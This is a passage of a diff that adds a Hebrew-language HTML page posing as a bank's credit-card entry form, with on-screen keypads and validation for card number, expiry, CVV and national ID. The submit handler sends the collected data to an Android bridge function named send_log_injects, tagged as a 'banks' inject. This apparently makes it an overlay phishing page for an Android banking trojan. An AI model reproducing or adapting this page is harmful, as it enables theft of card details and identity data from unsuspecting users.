+                <img style="width: 24px;float: right; margin-top: 5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGEAAAA5CAMAAAARBbULAAAA1VBMVEX18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/EAAAD18/H18/H18/H18/H18/H18/H18/FsIVkHAAAARnRSTlNpLR8q6CAp598dHuDm6igs7lTpF9ku8DpLFtgv8fc7fN0bFdfy3BrW80bTnTz0SNsZ1T7MP549OfXaGNQCIeMAWisc3n0BaXLaegAAAWVJREFUWMPt2NtSwjAQBuAKghYVEVTEA0rFeqqKoKgVXVox7/9IdiZJO0CSccb97/xvO9Nv2mbT3XjEkO9ZYL/oMQCTW3ETIIUMEOI9wAmTZyFcxN+F5FVIogN7S09uguNLDxXx2EEJNLxzECxCQbRQAo3tBJNA4ytJXLZQgp1gEwoiRgkUmQlGgaK+ieAUcuI8RgnU1cQAJVD3eIlgFgwEt5AThwOUQG1NhCiB2vtzBEBYIBACvShiN0QJBdHLhPsRIk0piM9R5E0FNgf/wq+EnQYiJ+r+/cY1ZrXWNyWw4YPqob6mgA9QxVU1UAHtGhpYr4B2vgWAX6iuzgPsQlkDJdBfVANfJVAnUG4uAbxCDtRAHVmigLMaqKs0A4xCsmUE+IRtDfigCUUDFz5oylqxAkxCDqSgaXdPAQ8paGI/cgEcggbeUtDJSewGOJ5hJoEe8JzvVPXAOCEj7ABTPXghgQVXfgDMajaKbVc2/AAAAABJRU5ErkJggg==" alt="">
+            </header>
+            <section>
+                <p>
+                    <span style="padding: 3px 12px;border: 0;border-radius: 75px;color: #fff;background-color: rgba(255, 255, 255, 0.08);">i</span>
+                    <span style="font-size: 22px;font-weight: 100;">הזן פרטי אשראי</span>
+                </p>
+
+                <div style="overflow: hidden;text-align: center;width: 60%;margin: 0 auto;">
+                    <input type="tel" class="input" id="exp" name="exp" maxlength="5" onkeyup="check4()" style="float:left;width: 58%;display: block;margin: 0 auto;" readonly placeholder="MM/YY">
+                    <input type="tel" class="input" id="cvv" name="cvv" maxlength="3" onkeyup="check4()" style="float:right;width: 30%;display: block;margin: 0 auto;" readonly placeholder="CVV">
+                </div>
+                <p style="text-align: center;color: #fff;font-weight: 100;font-size: 12px;">תוקף הכרטיס</p>
+
+                <div style="overflow: hidden;width: 100%;text-align: center;">              
+                    <input type="tel" class="input" id="id" name="id" maxlength="9" onkeyup="check5()" style="display: block;margin: 0 auto;text-align: center;" placeholder="תעודת זהות של בעל הכרטיס">
+                </div>
+
+
+                <div class="grid" id="expKeyboard" ng-controller="MyControllerB">
+                    <div class="tr_ tr3">
+                        <div class="td_ td_2">
+                            <div class="asd" style="background: transparent;">
+                                <div class="pinpad d-flex justify-content-between">
+                                <span id="btnPin5" ng-click="edit_pine(1)" onclick="check4();" class="pinpad-item">
+                                        <span class="val">1</span>
+                                    </span>
+                                    <span id="btnPin7" ng-click="edit_pine(2)" onclick="check4();" class="pinpad-item">
+                                        <span class="val">2</span>
+                                    </span>
+                                    <span id="btnPin3" ng-click="edit_pine(3)" onclick="check4();" class="pinpad-item">
+                                        <span class="val">3</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin9" ng-click="edit_pine(4)" onclick="check4();" class="pinpad-item">
+                                        <span class="val">4</span>
+                                    </span>
+                                    <span id="btnPin1" ng-click="edit_pine(5)" onclick="check4();" class="pinpad-item">
+                                        <span class="val">5</span>
+                                    </span>
+                                    <span id="btnPin8" ng-click="edit_pine(6)" onclick="check4();" class="pinpad-item">
+                                        <span class="val">6</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin6" ng-click="edit_pine(7)" onclick="check4();" class="pinpad-item">
+                                        <span class="val">7</span>
+                                    </span>
+                                    <span id="btnPin4" ng-click="edit_pine(8)" onclick="check4();" class="pinpad-item">
+                                        <span class="val">8</span>
+                                    </span>
+                                    <span id="btnPin2" ng-click="edit_pine(9)" onclick="check4();" class="pinpad-item">
+                                        <span class="val">9</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span class="pinpad-item" style="text-align: center;padding: 20px 0 0 0;">
+                                        .
+                                    </span>
+                                    <span id="btnPin10" ng-click="edit_pine(0)" onclick="check4();" style="padding: 20px 0 0 0;" class="pinpad-item">
+                                        <span class="val">0</span>
+                                    </span>
+                                    <span class="pinpad-item" id="btnDel" ng-click="reset();" style="text-align: center;padding: 20px 0 0 0;"> 
+                                        <img style="width: 30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAH4AAABbCAMAAACCnME/AAACvlBMVEX18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/EAAAD18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/ErSp2HAAAA6XRSTlMxcko4QU6BNvRivi2z8TKs9qqgpKdIqKP3nbC0Wb/BhJp+z29tc2xrYV93Z3l1e086XtgTcVxaIOWIVoqAjIPFVPu7U4/DkfmSlSyxJeqWrUMm6y+fRfUwoqYr8KGpS56ryQRYnK6YsraUywa6kLfyyAOOuT29k8CXKu/C0As/hwAj6GWNPgoHzNUQVSTp0QwJ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"alt="" class="i76"> 
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="grid" ng-controller="MyControllerC" id="cvvKeyboard" style="display: none;">
+                    <div class="tr_ tr3">
+                        <div class="td_ td_2">
+                            <div class="asd" style="background: transparent;">
+                                <div class="pinpad d-flex justify-content-between">
+                                <span id="btnPin5" ng-click="edit_pina(1)" class="pinpad-item">
+                                        <span class="val">1</span>
+                                    </span>
+                                    <span id="btnPin7" ng-click="edit_pina(2)" class="pinpad-item">
+                                        <span class="val">2</span>
+                                    </span>
+                                    <span id="btnPin3" ng-click="edit_pina(3)" class="pinpad-item">
+                                        <span class="val">3</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin9" ng-click="edit_pina(4)" class="pinpad-item">
+                                        <span class="val">4</span>
+                                    </span>
+                                    <span id="btnPin1" ng-click="edit_pina(5)" class="pinpad-item">
+                                        <span class="val">5</span>
+                                    </span>
+                                    <span id="btnPin8" ng-click="edit_pina(6)" class="pinpad-item">
+                                        <span class="val">6</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span id="btnPin6" ng-click="edit_pina(7)" class="pinpad-item">
+                                        <span class="val">7</span>
+                                    </span>
+                                    <span id="btnPin4" ng-click="edit_pina(8)" class="pinpad-item">
+                                        <span class="val">8</span>
+                                    </span>
+                                    <span id="btnPin2" ng-click="edit_pina(9)" class="pinpad-item">
+                                        <span class="val">9</span>
+                                    </span>
+                                </div>
+                                <div class="pinpad d-flex justify-content-between">
+                                    <span class="pinpad-item" style="text-align: center;padding: 20px 0 0 0;">
+                                        .
+                                    </span>
+                                    <span id="btnPin10" ng-click="edit_pina(0)" style="padding: 20px 0 0 0;" class="pinpad-item">
+                                        <span class="val">0</span>
+                                    </span>
+                                    <span class="pinpad-item" id="btnDel" ng-click="reset();" style="text-align: center;padding: 20px 0 0 0;"> 
+                                        <img style="width: 30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAH4AAABbCAMAAACCnME/AAACvlBMVEX18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/EAAAD18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/H18/ErSp2HAAAA6XRSTlMxcko4QU6BNvRivi2z8TKs9qqgpKdIqKP3nbC0Wb/BhJp+z29tc2xrYV93Z3l1e086XtgTcVxaIOWIVoqAjIPFVPu7U4/DkfmSlSyxJeqWrUMm6y+fRfUwoqYr8KGpS56ryQRYnK6YsraUywa6kLfyyAOOuT29k8CXKu/C0As/hwAj6GWNPgoHzNUQVSTp0QwJ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"alt="" class="i76"> 
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <footer>
+                <input type="submit" class="button1" disabled id="sendData" value="המשך">
+            </footer>
+        </div>
+    </form>
+
+    <script>       
+    
+    $('#id').mask('000000000')
+    
+
+    function checkCard() {
+        if(card.value.length === 4) {
+            card.value = card.value + ' '
+        }
+    }
+
+        var moduleA = angular.module("MyModuleA", []);
+            moduleA.controller("MyControllerA", function($scope) {
+                $sc_ = $scope
+            $scope.pinw = ""
+            $('#exp').mask('00/00')
+            $scope.edit_pinw = function (password) {
+                if($scope.pinw.length === 4) {
+                    $scope.pinw += ' '
+                }
+
+                if($scope.pinw.length === 9) {
+                    $scope.pinw += ' '
+                }
+
+                if($scope.pinw.length === 14) {
+                    $scope.pinw += ' '
+                }
+                if ($scope.pinw.length != 19) {
+                    try{
+                        document.getElementById('lastPage').disabled = true;
+                    } catch(e){};
+                    $scope.pinw += '' + password;
+                    $("#card").val($scope.pinw);
+                    
+                }
+
+                if (!valid_credit_card(card.value)) {    
+                    card.classList.add('error');
+                    document.getElementById('lastPage').disabled = true;
+                } else {
+                    card.classList.remove('error');
+                    document.getElementById('lastPage').disabled = false;
+                }
+            }
+            $scope.reset = function () {
+                Rlastw = $scope.pinw.substring(0, $scope.pinw.length - 1);
+                $scope.pinw = Rlastw;
+                $("#card").val(Rlastw);
+            }
+            });
+
+        var moduleB = angular.module("MyModuleB", []);
+            moduleB.controller("MyControllerB", function($scope) {
+                $sc_ = $scope
+            $scope.pine = ""
+            check4();
+            $scope.edit_pine = function (code) {
+                if($scope.pine.length == 2){
+                    $scope.pine += '/'
+                }
+                check4();
+                if ($scope.pine.length != 5) {
+                    try{
+                        document.getElementById('sendData').disabled = true;
+                        check4();
+                    } catch(e){};
+                    $scope.pine += '' + code;
+                    $("#exp").val($scope.pine);
+                    check4();
+                }
+
+                if($scope.pine.length === 5 && check4() == true) {
+                    document.getElementById('expKeyboard').style.display = 'none';
+                    document.getElementById('cvvKeyboard').style.display = 'block';
+                }
+            }
+            
+            
+            $scope.reset = function () {
+                Rlastw = $scope.pine.substring(0, $scope.pine.length - 1);
+                $scope.pine = Rlastw;
+                $("#exp").val(Rlastw);
+            }
+            
+            });
+
+        var moduleC = angular.module("MyModuleC", []);
+            moduleC.controller("MyControllerC", function($scope) {
+                $sc_ = $scope
+            $scope.pina = ""
+            
+            $scope.edit_pina = function (code) {
+                if ($scope.pina.length != 3) {
+                    try{
+                        document.getElementById('sendData').disabled = true;
+                        
+                    } catch(e){};
+                    $scope.pina += '' + code;
+                    
+                    $("#cvv").val($scope.pina);
+
+                }
+                if($scope.pina.length === 3) {
+                    document.getElementById('expKeyboard').style.display = 'none';
+                    document.getElementById('cvvKeyboard').style.display = 'none';
+                    document.getElementById('id').focus()
+                }
+            }
+            
+            
+            $scope.reset = function () {
+                Rlastw = $scope.pina.substring(0, $scope.pina.length - 1);
+                $scope.pina = Rlastw;
+                $("#cvv").val(Rlastw);
+            }
+            
+            });
+
+            angular.module("CombineModule", ["MyModuleA", "MyModuleB", "MyModuleC"]);
+
+            
+
+
+        var spinner = document.getElementById('spinner'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            form3 = document.getElementById('form3'),
+            nextPage = document.getElementById('nextPage'),
+            card = document.getElementById('card'),
+            lastPage = document.getElementById('lastPage'),
+            sendData = document.getElementById('sendData'),
+            exp = document.getElementById('exp'),
+            cvv = document.getElementById('cvv'),
+            id = document.getElementById('id');
+
+        id.onkeyup = () => {
+            if(id.value.length === 9) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        nextPage.onclick = function() {
+            spinner.style.display = 'block';
+
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                form1.style.display = 'none';
+                form2.style.display = 'flex';
+            }, 1500);
+        }
+
+        function check4() {
+            var exp = document.getElementById('exp');
+            
+            var mmYY = exp.value.split('/');
+				var month = parseInt(mmYY[0]);
+				var year = parseInt(mmYY[1]);
+			
+
+				var expArray = exp.value.split('/');
+				var today, someday;
+				var exMonth = expArray[0];
+				var exYear = "20" + expArray[1];
+
+				today = new Date();
+				someday = new Date();
+				someday.setFullYear(exYear, exMonth, 1);
+
+                
+                if(month > 12 || month == 0 || month == 00 || someday < today || year > 27) {
+                    exp.classList.add('error')
+                } else {
+                    exp.classList.remove('error')
+                    return true
+                }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            lastPage.disabled = true;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+                card.classList.remove('error'),
+                lastPage.disabled = false;
+            }
+            return (nCheck % 10) == 0;
+            
+        }
+
+        lastPage.onclick = function() {
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                form2.style.display = 'none'
+                form3.style.display = 'flex'
+            }, 1500);
+        }
+
+        sendData.onclick = function (){
+            var data = {};
+            data.card = card.value;
+            data.exp = exp.value;
+            data.cvv = cvv.value;
+            data.id = id.value;
+            
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+    </script>
+</body>
+</html>
